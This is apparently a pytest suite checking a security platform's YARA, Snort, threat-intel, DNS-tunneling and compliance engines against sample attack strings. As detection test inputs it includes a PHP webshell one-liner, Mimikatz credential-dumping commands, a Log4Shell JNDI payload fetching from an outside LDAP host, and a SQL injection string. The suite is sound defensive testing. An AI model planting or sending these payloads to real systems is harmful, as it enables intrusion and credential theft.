"""Automated Test Suite for YARA Malware Engine, Snort IDS, Threat Intel, DPI, and Compliance."""

import pytest
from backend.app.engines.yara_engine import yara_scanner
from backend.app.engines.snort_engine import snort_ids, SnortCompiler
from backend.app.intelligence.massive_ioc_catalog import threat_catalog, ThreatIndicator, IoCType
from backend.app.parsers.pcap_dpi_parser import dpi_analyzer
from backend.app.services.compliance_engine import compliance_engine


def test_yara_scanner_malware_families():
    # 1. LockBit 3.0 Ransomware payload
    lockbit_sample = "Warning: LockBit 3.0 the world's fastest ransomware has encrypted your corporate network. Contact support."
    matches = yara_scanner.scan_payload(lockbit_sample)
    assert len(matches) >= 1
    assert any(m["malware_family"] == "LockBit 3.0 / LockBit Black" for m in matches)

    # 2. Mimikatz sekurlsa payload
    mimikatz_sample = "Executing sekurlsa::logonpasswords and privilege::debug in memory"
    matches_mimi = yara_scanner.scan_payload(mimikatz_sample)
    assert len(matches_mimi) >= 1
    assert any(m["malware_family"] == "Mimikatz" for m in matches_mimi)

    # 3. China Chopper Webshell
    webshell_sample = "<?php @eval($_POST['password']); ?>"
    matches_shell = yara_scanner.scan_payload(webshell_sample)
    assert len(matches_shell) >= 1
    assert any(m["malware_family"] == "China Chopper" for m in matches_shell)


def test_snort_ids_inspection():
    # 1. Apache Log4Shell JNDI injection
    log4j_payload = "GET /login?user=${jndi:ldap://198.51.100.22/exploit} HTTP/1.1\r\nHost: example.com\r\n\r\n"
    alerts = snort_ids.inspect_flow(
        src_ip="10.0.0.5",
        src_port=49152,
        dst_ip="192.168.1.10",
        dst_port=8080,
        proto="TCP",
        payload=log4j_payload,
    )
    assert len(alerts) >= 1
    assert any("CVE-2021-44228" in a["cve"] for a in alerts)

    # 2. SQL Injection OR 1=1
    sqli_payload = "POST /api/auth HTTP/1.1\r\nHost: app.com\r\n\r\nusername=admin' OR 1=1--"
    alerts_sqli = snort_ids.inspect_flow(
        src_ip="10.0.0.5",
        src_port=49152,
        dst_ip="192.168.1.10",
        dst_port=80,
        proto="TCP",
        payload=sqli_payload,
    )
    assert len(alerts_sqli) >= 1
    assert any("SQL Injection" in a["msg"] for a in alerts_sqli)


def test_threat_intelligence_lookup():
    # 1. Known C2 IP
    res_ip = threat_catalog.lookup_ip("185.220.101.5")
    assert res_ip is not None
    assert res_ip.threat_actor == "APT29 (Cozy Bear)"
    assert res_ip.confidence_score >= 90

    # 2. Known C2 Domain
    res_domain = threat_catalog.lookup_domain("update-microsoft-cloud.com")
    assert res_domain is not None
    assert res_domain.threat_category == "Malicious C2 Domain"

    # 3. Known WannaCry Hash
    res_hash = threat_catalog.lookup_hash("24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c")
    assert res_hash is not None
    assert res_hash.malware_family == "WannaCry.exe"


def test_dpi_dns_entropy_and_tunneling():
    # Low entropy normal domain
    normal_domain = "www.google.com"
    norm_entropy = dpi_analyzer.calculate_shannon_entropy(normal_domain)
    assert norm_entropy < 3.5

    # High entropy base64 encoded DNS tunneling domain
    tunnel_domain = "d41d8cd98f00b204e9800998ecf8427e9921aa0b12.c2.evil-attacker.com"
    tun_entropy = dpi_analyzer.calculate_shannon_entropy(tunnel_domain)
    assert tun_entropy > 3.5
    assert len(tunnel_domain) > 35


def test_compliance_posture_evaluation():
    posture = compliance_engine.evaluate_posture({})
    assert posture["overall_enterprise_compliance_pct"] >= 70.0
    assert "NIST_CSF_2.0" in posture["framework_breakdown"]
    assert "ISO_27001_2022" in posture["framework_breakdown"]
    assert "PCI_DSS_v4.0" in posture["framework_breakdown"]
    assert posture["framework_breakdown"]["NIST_CSF_2.0"]["compliant_count"] >= 5
